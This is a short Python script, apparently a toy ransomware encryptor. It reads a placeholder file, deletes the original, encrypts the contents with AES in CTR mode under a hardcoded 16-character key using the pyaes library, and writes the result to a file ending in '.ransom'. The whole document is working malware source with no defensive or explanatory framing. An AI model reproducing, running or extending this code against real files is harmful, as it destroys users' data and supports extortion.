import os
import pyaes

file_name = "(filename.extension)"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = "1234567812345678" #16 digit encryption key.
aes = pyaes.AESModeOfOperationCTR(key.encode())
crypto_data = aes.encrypt(file_data)

new_file_name = file_name + ".ransom"
new_file = open(new_file_name, "wb")
new_file.write(crypto_data)
new_file.close()
